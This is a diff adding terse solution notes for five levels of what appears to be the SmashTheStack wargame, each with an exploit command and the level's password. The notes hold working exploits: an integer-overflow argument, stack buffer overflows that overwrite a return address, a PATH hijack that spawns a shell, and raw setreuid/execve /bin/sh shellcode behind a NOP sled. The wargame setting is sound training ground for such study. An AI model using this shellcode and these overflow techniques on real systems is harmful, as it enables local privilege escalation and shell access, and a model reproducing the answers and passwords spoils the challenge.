@@ -1,0 +1,19 @@
+level1:
+    sloution 271
+    pass:3ywr07ZFw5IsdKzU
+level2:
+    slotuion ./level02 -2147483648 -1
+    pass: IFd92yzOnSMv9tkX
+level3:
+    sloution ./level03 $(python -c 'print "0"*76+"\x74\x84\x04\x08"')
+    pass nSwmULj2LpDnRGU2
+level4:
+    slotuin /tmp/ckone4whoami (os.system("bin\sh"),
+    export PATH=/tmp/ckone4:$PATH
+    ./level04
+    pass LOoCy5PbKi63qXTh
+level5:
+    slotuion: ./level05 `python -c 'print "\x90"*89+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x46\x66\xbb\xee\x03\x66\xb9\xee\x03\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\xeb\x06\x5b\x88\x4b\x07\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e"+"\x40\xfe\xff\xbf"'`
+    http://conceptofproof.wordpress.com/2013/10/28/level-5-smashthestack-walkthrough/
+    pass: rXCikld0ex3EQsnI
+    
